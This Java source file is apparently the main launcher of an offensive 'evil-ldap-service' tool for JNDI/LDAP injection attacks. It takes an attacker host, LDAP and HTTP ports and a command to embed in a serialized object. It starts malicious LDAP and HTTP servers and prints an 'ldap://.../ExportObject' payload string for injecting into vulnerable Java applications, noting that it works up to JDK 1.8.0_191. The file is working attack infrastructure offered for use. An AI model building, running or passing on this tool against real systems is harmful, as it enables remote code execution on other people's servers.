package gds.els;

import java.net.InetAddress;
import java.net.UnknownHostException;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

public class Main {

	public static void main(String[] args) {

		Options options = new Options();

		InetAddress host;
		Option input1 = new Option("l", "host", true, "listening ip/host");
		input1.setRequired(true);
		options.addOption(input1);

		int ldapPort;
		Option input2 = new Option("lp", "ldap-port", true, "LDAP listening port");
		input2.setRequired(true);
		options.addOption(input2);

		int httpPort;
		Option input3 = new Option("hp", "http-port", true, "HTTP listening port");
		input3.setRequired(true);
		options.addOption(input3);

		String command;
		Option input4 = new Option("c", "command", true, "command in serialized object");
		input4.setRequired(true);
		options.addOption(input4);

		CommandLineParser parser = new DefaultParser();
		HelpFormatter formatter = new HelpFormatter();
		CommandLine cmd;

		try {
			cmd = parser.parse(options, args);

			host = InetAddress.getByName(cmd.getOptionValue("host"));
			ldapPort = Integer.parseInt(cmd.getOptionValue("ldap-port"));
			httpPort = Integer.parseInt(cmd.getOptionValue("http-port"));
			command = cmd.getOptionValue("command");

			MyHttpServer.run(host, httpPort, command);
			MyLdapServer.run(host, ldapPort, httpPort);

			System.out.println("[+] Exploit services configured. Use the following payload:");
			System.out.println("ldap://" + host.getHostAddress() + ":" + ldapPort + "/ExportObject\n");

		} catch (ParseException | UnknownHostException e) {
			System.out.println(e.getMessage());
			formatter.printHelp("evil-ldap-service works until JDK 1.8.0_191", options);
			System.exit(1);
		}

	}
}
